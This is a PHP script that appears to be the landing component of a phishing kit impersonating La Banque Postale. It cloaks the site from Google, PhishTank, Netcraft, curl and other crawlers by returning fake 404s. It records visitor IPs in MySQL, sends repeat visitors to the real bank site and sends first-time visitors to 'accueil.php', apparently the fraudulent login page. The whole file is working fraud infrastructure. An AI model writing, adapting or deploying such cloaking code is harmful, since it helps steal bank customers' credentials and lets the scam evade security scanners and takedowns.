<?php

$ip = $_SERVER['REMOTE_ADDR'];


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'orange',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
        'phishtank',
        'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
        foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
        return false;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    header('HTTP/1.0 404 Not Found'); 
    echo "HTTP/1.0 404 Not Found";
    exit();
}
function generateRandomString($length) {
    $characters = '0123456789abcdefjhigklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

   $hach = sha1(microtime());
   $one = generateRandomString(8);
   $too = generateRandomString(8);
   $try = generateRandomString(8);
   $max = generateRandomString(8);
   $max2 = generateRandomString(8);
   $max3 = generateRandomString(8);

$servname = 'localhost';
$dbname = 'ip';
$user = 'root';
$pass = '';
$ip = getenv("REMOTE_ADDR");

try{
    $db = new PDO("mysql:host=$servname;dbname=$dbname", $user, $pass);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
}
catch(PDOException $e){
                        echo "Erreur : " . $e->getMessage();
                        }

$select = $db->prepare('SELECT ip FROM ip WHERE ip = ?');
$select->execute([$ip]);

if ($select->rowCount() > 0) {
    echo '<script type="text/javascript">'; 
    echo 'setTimeout(function(){window.location.href = "https://labanquepostale.fr";}, 1000);';
    echo '</script>'; 
} 

else {
    
            
            try{                
                $db->beginTransaction();
                
                $sql1 = "INSERT INTO ip(ip) VALUES('$ip')";
                $db->exec($sql1);
                
                $db->commit();
                echo '<script type="text/javascript">'; 
                echo 'setTimeout(function(){window.location.href = "accueil.php";}, 1000);';
                echo '</script>'; 

            }
            
            catch(PDOException $e){
                $db->rollBack();
              echo "Erreur : " . $e->getMessage();
            }
}

?>